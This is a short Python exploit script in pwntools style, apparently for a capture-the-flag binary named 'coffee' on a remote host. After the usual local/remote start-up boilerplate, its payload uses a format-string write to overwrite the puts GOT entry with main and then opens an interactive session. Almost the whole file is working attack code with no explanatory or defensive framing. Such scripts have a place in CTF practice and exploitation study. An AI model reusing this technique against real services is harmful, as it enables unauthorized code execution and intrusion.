#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./coffee')

host = args.HOST or 'nc.eonew.cn'
port = int(args.PORT or 10002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
payload = fmtstr_payload(offset=6, writes={exe.got.puts: exe.sym.main}, write_size='short')
print(payload)
sl(payload)
re()
io.interactive()

